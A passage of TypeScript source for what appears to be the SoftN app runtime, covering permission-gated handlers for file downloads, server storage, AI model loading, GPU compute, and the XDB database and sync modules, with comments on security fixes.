    const [rawName, content, optionsJson] = call.args;
    let options: { mime?: string; base64?: boolean } = {};
    if (optionsJson) {
      try {
        options = JSON.parse(optionsJson) as { mime?: string; base64?: boolean };
      } catch {
        return { error: 'The save options are not valid JSON.' };
      }
    }
    // A download the person asked for, with a click or a key: not one an app
    // starts on a timer, as many as it likes, attributed to the host's site.
    const activation = typeof navigator === 'undefined' ? undefined : (navigator as { userActivation?: { isActive?: boolean } }).userActivation;
    if (activation && activation.isActive === false) {
      return { error: 'A file is saved when the person asks for it: call files.saveFile from a click or a key press.' };
    }
    const name = downloadName(rawName);
    // A type the content says it is, or bytes.
    const mime =
      typeof options.mime === 'string' && /^[\w.+-]+\/[\w.+-]+(?:;\s*charset=[\w-]+)?$/.test(options.mime)
        ? options.mime
        : options.base64
          ? 'application/octet-stream'
          : 'text/plain;charset=utf-8';
    let blob: Blob;
    if (options.base64) {
      let buffer: ArrayBuffer;
      try {
        const bin = atob(String(content || '').replace(/^data:[^,]*,/, ''));
        buffer = new ArrayBuffer(bin.length);
        const bytes = new Uint8Array(buffer);
        for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
      } catch {
        return { error: 'The content is not valid base64.' };
      }
      blob = new Blob([buffer], { type: mime });
    } else {
      blob = new Blob([String(content ?? '')], { type: mime });
    }
    if (typeof document === 'undefined' || typeof URL === 'undefined' || typeof URL.createObjectURL !== 'function') {
      return { error: 'Saving files is not available here.' };
    }
    const url = URL.createObjectURL(blob);
    try {
      const a = document.createElement('a');
      a.href = url;
      a.download = name;
      a.style.display = 'none';
      document.body.appendChild(a);
      a.click();
      a.remove();
    } finally {
      // The click has started the download; the URL only needs to outlive it.
      setTimeout(() => URL.revokeObjectURL(url), 30_000);
    }
    return { ok: true, name, size: blob.size };
  }

  // ── Server storage (softn.storage.*) ──

  /**
   * One operation against the app's own database on the directory that
   * published it. The runtime knows nothing of SQL: the script asks for
   * records and keys, the request carries the operation and its arguments as
   * JSON, and the server enforces its quotas and its limits. An app opened
   * from a file rather than from a directory has no endpoint and is told so,
   * in the same `{error}` shape every other refused call uses.
   */
  private async handleStorageOp(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('storage');
    const [op, argsJson] = call.args;
    if (!this.storageEndpoint) {
      return {
        error: 'This app has no server storage: it was not opened from a directory that publishes it.',
      };
    }
    let args: Record<string, unknown> = {};
    if (argsJson) {
      try {
        args = JSON.parse(argsJson) as Record<string, unknown>;
      } catch {
        return { error: 'The storage arguments are not valid JSON.' };
      }
    }
    const abortController = new AbortController();
    const timeout = setTimeout(() => abortController.abort(), 20_000);
    this.netAbortControllers.add(abortController);
    try {
      // The visitor's standing for collections that record who added what.
      // The host's token if it gave one; else this browser's; else none, and
      // such collections refuse with a message that says why.
      const token = this.visitorToken === undefined ? storageVisitorToken() : this.visitorToken;
      const headers: Record<string, string> = { 'Content-Type': 'application/json' };
      if (token) headers['X-Visitor-Token'] = token;
      const resp = await fetch(this.storageEndpoint, {
        method: 'POST',
        headers,
        body: JSON.stringify({ op, ...args }),
        signal: abortController.signal,
        credentials: 'same-origin',
      });
      const text = await resp.text();
      let json: { ok?: boolean; result?: unknown; error?: string; retryAfter?: number } | null = null;
      try {
        json = JSON.parse(text);
      } catch {
        json = null;
      }
      if (!resp.ok || !json || json.ok !== true) {
        return {
          error: json?.error ?? `The storage server answered ${resp.status}.`,
          status: resp.status,
          retryAfter: json?.retryAfter,
        };
      }
      return json.result ?? null;
    } catch (err) {
      if (abortController.signal.aborted) return { error: 'The storage request timed out.' };
      return { error: err instanceof Error ? err.message : String(err) };
    } finally {
      clearTimeout(timeout);
      this.netAbortControllers.delete(abortController);
    }
  }

  // ── AI host call handlers ──

  private async getModelHost(): Promise<import('./models/model-host').ModelHost> {
    if (!this.modelHost) {
      const { ModelHost } = await import('./models/model-host');
      // The net declaration rides along: a model URL is egress like any other.
      this.modelHost = new ModelHost({
        ai: this.permissionConfig?.permissions.ai,
        net: this.permissionConfig?.permissions.net,
        readBundleFile: (path) => this.readBundleBlob(path),
      });
    }
    return this.modelHost;
  }

  private async handleAIGetCapabilities(): Promise<unknown> {
    // The only capability-shaped handler that answered anyone. It reports
    // webgpu/webgl/wasm availability and a maxModelSizeMB derived from
    // navigator.deviceMemory — a device fingerprint .logic has no other route
    // to — and it answered a bundle shipping no permission.json, and a bundle
    // whose consent bar was still up.
    this.checkPermission('ai');
    const { detectCapabilities } = await import('./ai-manager');
    return detectCapabilities();
  }

  private async handleAIReleaseAll(): Promise<unknown> {
    this.modelHost?.releaseAll();
    if (this.gpuComputeManager) await this.gpuComputeManager.releaseAll();
    return { released: true };
  }

  private async handleAIModelLoad(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('ai');
    const [spec, optionsJson] = call.args;
    // A string names a Hugging Face repository or a URL; an object says which
    // ({huggingface, file}, {url} or {bundle}).
    const source = typeof spec === 'string' && spec.trimStart().startsWith('{') ? JSON.parse(spec) : spec;
    const options = optionsJson ? JSON.parse(optionsJson) : {};
    const host = await this.getModelHost();
    return host.load(source, options && typeof options === 'object' ? options : {});
  }

  private async handleAIModelGenerate(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('ai');
    const [modelHandle, messagesJson, optionsJson] = call.args;
    const messages = JSON.parse(messagesJson);
    const options = optionsJson ? JSON.parse(optionsJson) : {};
    const host = await this.getModelHost();
    return host.generate(modelHandle, messages, options && typeof options === 'object' ? options : {});
  }

  private async handleAIModelRelease(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('ai');
    const [modelHandle] = call.args;
    return { released: this.modelHost?.release(String(modelHandle ?? '')) ?? false };
  }

  // ── GPU compute host call handlers ──

  private async getGpuComputeManager(): Promise<
    import('./ai-gpu-compute-manager').GpuComputeManager
  > {
    if (!this.gpuComputeManager) {
      const { GpuComputeManager } = await import('./ai-gpu-compute-manager');
      this.gpuComputeManager = new GpuComputeManager();
      if (this.bundleFileProvider) {
        this.gpuComputeManager.setBundleFileProvider(this.bundleFileProvider);
      }
      if (this.permissionConfig?.permissions.gpu) {
        this.gpuComputeManager.setPermissionConfig(this.permissionConfig.permissions.gpu);
      }
    }
    return this.gpuComputeManager;
  }

  private async handleGpuRequestDevice(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('gpu');
    const options = call.args[0] ? JSON.parse(call.args[0]) : {};
    const mgr = await this.getGpuComputeManager();
    return mgr.requestDevice(options);
  }

  private async handleGpuCreateBuffer(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('gpu');
    const [sourceJson, usage] = call.args;
    const source = JSON.parse(sourceJson);
    const mgr = await this.getGpuComputeManager();
    return mgr.createBuffer(source, usage);
  }

  private async handleGpuWriteBuffer(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('gpu');
    const [bufferId, dataJson, dtype] = call.args;
    const data = JSON.parse(dataJson);
    const mgr = await this.getGpuComputeManager();
    return mgr.writeBuffer(bufferId, data, dtype || undefined);
  }

  private async handleGpuCreateShader(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('gpu');
    const [sourceJson] = call.args;
    const source = JSON.parse(sourceJson);
    const mgr = await this.getGpuComputeManager();
    return mgr.createShader(source);
  }

  private async handleGpuCreatePipeline(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('gpu');
    const [optionsJson] = call.args;
    const options = JSON.parse(optionsJson);
    const mgr = await this.getGpuComputeManager();
    return mgr.createPipeline(options);
  }

  private async handleGpuDispatch(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('gpu');
    const [pipelineId, bindingsJson, workgroupsJson] = call.args;
    const bindings = JSON.parse(bindingsJson);
    const workgroups = JSON.parse(workgroupsJson);
    const mgr = await this.getGpuComputeManager();
    return mgr.dispatch(pipelineId, bindings, workgroups);
  }

  private async handleGpuReadBuffer(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('gpu');
    const [bufferId] = call.args;
    const mgr = await this.getGpuComputeManager();
    return mgr.readBuffer(bufferId);
  }

  private async handleGpuRelease(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('gpu');
    const [resourceId] = call.args;
    const mgr = await this.getGpuComputeManager();
    return mgr.release(resourceId);
  }

  private async handleGpuReleaseAll(): Promise<unknown> {
    // The only gpu handler that reached getGpuComputeManager unchecked, and the
    // getter only wires the declared limits into a manager it is creating. A
    // denied app calling this built the manager with no config at all, and the
    // `if (!this.gpuComputeManager)` cache meant the buffer cap and the shader
    // allowlist were then missing for the rest of the session.
    this.checkPermission('gpu');
    const mgr = await this.getGpuComputeManager();
    return mgr.releaseAll();
  }
}

/**
 * Create a SoftN script runtime
 * @param context - Script execution context
 * @param permissions - Optional permissions manifest from bundle for capability enforcement
 * @param appId - Optional app identifier for localStorage namespace isolation
 */
export function createScriptRuntime(
  context: ScriptContext,
  permissions?: AppPermissions,
  appId?: string,
  importResolver?: unknown,
  logicBasePath?: string,
  options?: ScriptRuntimeOptions,
  bundleFileProvider?: BundleFileProvider,
  externalFunctions?: Record<string, (...args: unknown[]) => unknown>
): ScriptRuntimeHandle {
  return new SoftNScriptRuntime(
    context,
    permissions,
    appId,
    importResolver,
    logicBasePath,
    options,
    bundleFileProvider,
    externalFunctions
  );
}

/**
 * The host-injected functions as the script sees them: a snapshot of every
 * synchronous primitive-valued getter, declared as a function returning its
 * value. This is the contract the main-thread runtime compiles (step 4 of its
 * loadScript), extracted so a script hosted in a worker is handed the same
 * declarations. `xdb_*` and `asset` are served by other bridges and skipped,
 * as they are there. The worker's snapshot is taken once, at load: nothing
 * refreshes it afterwards, where the main thread refreshes its table on every
 * call — a known gap, acceptable for values that do not move while an app runs.
 */
export function buildExternalValuesPreamble(
  externalFunctions: Record<string, (...args: unknown[]) => unknown> | null | undefined
): string {
  if (!externalFunctions) return '';
  const names: string[] = [];
  const values: unknown[] = [];
  for (const name of Object.keys(externalFunctions)) {
    if (!VALID_IDENTIFIER.test(name) || EXTERNAL_FUNCTION_RESERVED_NAMES.has(name)) continue;
    if (name.startsWith('xdb_') || name === 'asset') continue;
    let value: ExternalValueRead;
    try {
      const fn = externalFunctions[name];
      if (typeof fn !== 'function') continue;
      const result = fn();
      if (result != null && typeof (result as { then?: unknown }).then === 'function') {
        Promise.resolve(result).catch(() => {});
        continue;
      }
      value = normalizeExternalPrimitive(result);
    } catch {
      continue;
    }
    if (value === UNSUPPORTED_EXTERNAL_VALUE) continue;
    names.push(name);
    values.push(value);
  }
  if (names.length === 0) return '';
  const serialized = values.map((v) => (v === undefined ? 'undefined' : JSON.stringify(v))).join(',');
  let preamble = `let ${EXTERNAL_VALUES_VAR} = [${serialized}];
`;
  for (let i = 0; i < names.length; i++) {
    preamble += `function ${names[i]}() { return ${EXTERNAL_VALUES_VAR}[${i}]; }
`;
  }
  return preamble;
}

/** What the Web Worker runtime asks of the main thread; see `createHostCallExecutor`. */
export interface HostCallExecutor {
  executeHostCall(call: PendingHostCall): Promise<unknown>;
  cleanup(): void;
  /** Whose captured keys and app element these are (key-capture.ts). */
  readonly owner: object;
}

/**
 * A `softn.*` executor for a script that runs in a worker. It is the
 * main-thread runtime with no script loaded: the same handlers, the same
 * permission checks, the same file registry — only the VM is elsewhere.
 */
export function createHostCallExecutor(
  context: ScriptContext,
  permissions?: AppPermissions,
  appId?: string,
  importResolver?: unknown,
  logicBasePath?: string,
  options?: ScriptRuntimeOptions,
  bundleFileProvider?: BundleFileProvider,
  externalFunctions?: Record<string, (...args: unknown[]) => unknown>
): HostCallExecutor {
  const runtime = new SoftNScriptRuntime(
    context,
    permissions,
    appId,
    importResolver,
    logicBasePath,
    options,
    bundleFileProvider,
    externalFunctions
  );
  return {
    executeHostCall: (call) => runtime.executeHostCallExternal(call),
    cleanup: () => runtime.cleanup(),
    owner: runtime,
  };
}

/**
 * Create an XDB module that uses the real XDB service with localStorage persistence
 * This replaces the old mock implementation with actual persistence.
 */
export function createPersistentXDBModule(appId?: string): XDBModule {
  // Import dynamically to avoid circular dependency
  // The XDB service is created lazily when needed
  let xdbService: import('./xdb').XDBService | null = null;

  const getXDB = async () => {
    if (!xdbService) {
      const { getXDB: getXDBInstance } = await import('./xdb');
      xdbService = getXDBInstance(appId);
    }
    return xdbService;
  };

  return {
    create: async (collection: string, data: Record<string, unknown>) => {
      const xdb = await getXDB();
      return xdb.isP2PAvailable()
        ? xdb.createAsync(collection, data)
        : xdb.create(collection, data);
    },

    update: async (id: string, data: Record<string, unknown>) => {
      const xdb = await getXDB();
      const record = xdb.isP2PAvailable() ? await xdb.updateAsync(id, data) : xdb.update(id, data);
      if (!record) {
        throw new Error(`Record not found: ${id}`);
      }
      return record;
    },

    delete: async (id: string) => {
      const xdb = await getXDB();
      if (xdb.isP2PAvailable()) {
        await xdb.deleteAsync(id);
      } else {
        xdb.delete(id);
      }
    },

    query: async (collection: string, filter?: Record<string, unknown>) => {
      const xdb = await getXDB();
      if (xdb.isP2PAvailable()) {
        return xdb.queryAsync(collection, filter ? { filter } : undefined);
      }
      return xdb.query(collection, filter ? { filter } : undefined);
    },

    get: async (collection: string, id: string) => {
      const xdb = await getXDB();
      if (xdb.isP2PAvailable()) {
        return xdb.getAsync(collection, id);
      }
      return xdb.get(collection, id);
    },

    sync: async () => {
      const xdb = await getXDB();
      return xdb.sync();
    },
  };
}

/**
 * DB namespace interface for direct use in <logic> blocks
 * Provides a clean, synchronous API for database operations
 */
export interface DBNamespace {
  query: (collection: string, filter?: Record<string, unknown>) => XDBRecord[];
  create: (collection: string, data: Record<string, unknown>) => XDBRecord;
  update: (id: string, data: Record<string, unknown>) => XDBRecord;
  delete: (id: string) => void;
  hardDelete: (collection: string, id: string) => void;
  get: (collection: string, id: string) => XDBRecord | null;
  /**
   * Prune a collection to keep at most `maxRecords` records.
   * Removes oldest records first (by created_at). Returns number of records removed.
   */
  prune: (collection: string, maxRecords: number) => number;
  /** Remove all records from a collection */
  clearCollection: (collection: string) => void;
  startSync: (room: string, options?: Record<string, unknown>) => void;
  stopSync: (room?: string) => void;
  getSyncStatus: (room?: string) => {
    connected: boolean;
    peers: number;
    room: string;
    peerId: string;
  };
  getSavedSyncRoom: () => string | null;
  /** Wait for the XDB service to finish initializing */
  ready: () => Promise<void>;
}

/**
 * Create a synchronous db namespace for use in <logic> blocks
 * This uses the XDB service synchronously for immediate data access
 */
export function createDBNamespace(
  getPermissionConfig?: () => PermissionConfig | null,
  appId?: string,
  syncEncryptionKeyHex?: string
): DBNamespace {
  // Import XDB directly - this module uses a singleton pattern
  // We use a wrapper that will lazily initialize
  let xdbService: import('./xdb').XDBService | null = null;
  let xdbPromise: Promise<import('./xdb').XDBService> | null = null;

  // Start loading XDB immediately but don't block
  const initXDB = async () => {
    if (!xdbPromise) {
      xdbPromise = import('./xdb').then((m) => {
        xdbService = m.getXDB(appId);
        return xdbService;
      });
    }
    return xdbPromise;
  };

  const getXDBSync = (): import('./xdb').XDBService => {
    if (!xdbService) {
      // If not yet loaded, trigger load and throw a meaningful error
      // In practice, by the time user actions happen, XDB should be loaded
      initXDB();
      throw new Error('XDB is still initializing. This should not happen in normal use.');
    }
    return xdbService;
  };

  return {
    query: (collection: string, filter?: Record<string, unknown>) => {
      const xdb = getXDBSync();
      return xdb.query(collection, filter ? { filter } : undefined);
    },

    create: (collection: string, data: Record<string, unknown>) => {
      const xdb = getXDBSync();
      return xdb.create(collection, data);
    },

    update: (id: string, data: Record<string, unknown>) => {
      const xdb = getXDBSync();
      const record = xdb.update(id, data);
      if (!record) {
        throw new Error(`Record not found: ${id}`);
      }
      return record;
    },

    delete: (id: string) => {
      const xdb = getXDBSync();
      xdb.delete(id);
    },

    hardDelete: (collection: string, id: string) => {
      const xdb = getXDBSync();
      xdb.hardDelete(collection, id);
    },

    get: (collection: string, id: string) => {
      const xdb = getXDBSync();
      return xdb.get(collection, id);
    },

    // The sync methods are one implementation shared with the renderer's xdb
    // helpers (db-sync-controls.ts): same gate, same host-bound options, same
    // signalling rules, same wire scope and key. A script cannot catch a host
    // refusal, so this surface logs it and returns.
    ...createSyncControls({
      appId,
      getPermissionConfig: () => getPermissionConfig?.() ?? null,
      syncEncryptionKeyHex,
      refuse: (reason) => {
        console.error(
          reason === 'pending'
            ? '[XDB Sync] Sync not allowed yet. Choose Allow in the permission bar to grant it.'
            : '[XDB Sync] Sync not permitted. Add sync.enabled to permission.json'
        );
      },
    }),

    prune: (collection: string, maxRecords: number) => {
      const xdb = getXDBSync();
      const records = xdb.query(collection);
      if (records.length <= maxRecords) return 0;
      // Sort by created_at ascending (oldest first)
      const sorted = [...records].sort((a, b) =>
        (a.created_at || '').localeCompare(b.created_at || '')
      );
      const toRemove = sorted.slice(0, records.length - maxRecords);
      // In one write: one hardDelete each rewrote the whole collection, so
      // pruning grew with the square of its size.
      return xdb.hardDeleteMany(collection, toRemove.map((rec) => rec.id));
    },

    clearCollection: (collection: string) => {
      const xdb = getXDBSync();
      xdb.hardDeleteMany(collection, xdb.query(collection).map((rec) => rec.id));
    },

    ready: () => initXDB().then(() => {}),
  };
}

// The sync module cache lives with the shared sync controls; re-exported here
// because the renderer and the worker runtime import it from this module.
export { getSyncModuleCache, setSyncModuleCache } from './db-sync-controls';

/**
 * Create a mock XDB module (for testing without persistence)
 * @deprecated Use createPersistentXDBModule() instead for real applications
 */
export function createMockXDBModule(): XDBModule {
  // For backwards compatibility, use the in-memory mock
  const collections = new Map<string, XDBRecord[]>();

  return {
    create: async (collection: string, data: Record<string, unknown>) => {
      const record: XDBRecord = {
        id:
          typeof crypto !== 'undefined' && crypto.randomUUID
            ? crypto.randomUUID()
            : `mock-${Date.now()}-${Math.random().toString(36).slice(2)}`,
        collection,
        data,
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
        deleted: false,
      };

      if (!collections.has(collection)) {
        collections.set(collection, []);
      }
      collections.get(collection)!.push(record);

      return record;
    },

    update: async (id: string, data: Record<string, unknown>) => {
      for (const records of collections.values()) {
        const record = records.find((r) => r.id === id);
        if (record) {
          record.data = { ...record.data, ...data };
          record.updated_at = new Date().toISOString();
          return record;
        }
      }
      throw new Error(`Record not found: ${id}`);
    },

    delete: async (id: string) => {
      for (const records of collections.values()) {
        const record = records.find((r) => r.id === id);
        if (record) {
          record.deleted = true;
          record.updated_at = new Date().toISOString();
          return;
        }
      }
    },

    query: async (collection: string, filter?: Record<string, unknown>) => {
      const records = collections.get(collection) || [];
      return records.filter((r) => {
        if (r.deleted) return false;
        if (!filter) return true;

        for (const [key, value] of Object.entries(filter)) {
          if (r.data[key] !== value) return false;
        }
        return true;
      });
    },

    get: async (collection: string, id: string) => {
      const records = collections.get(collection) || [];
      return records.find((r) => r.id === id && !r.deleted) || null;
    },

    sync: async () => {
      debug('Mock XDB sync (no-op)');
    },
  };
}

/**
 * Create a mock nav module
 */
export function createMockNavModule(onNavigate?: (page: string) => void): NavModule {
  return {
    goto: (page: string) => {
      debug('[SoftN Nav] goto:', page);
      onNavigate?.(page);
    },
    back: () => {
      debug('[SoftN Nav] back');
      if (typeof window !== 'undefined') {
        window.history.back();
      }
    },
    params: {},
  };
}

/**
 * Create a console module that forwards to the browser console
 */
export function createConsoleModule(): ConsoleModule {
  return {
    // eslint-disable-next-line no-console -- this is the console an app's scripts call: their log belongs in the console
    log: (...args: unknown[]) => console.log('[SoftN]', ...args),
    error: (...args: unknown[]) => console.error('[SoftN]', ...args),
    warn: (...args: unknown[]) => console.warn('[SoftN]', ...args),
  };
}
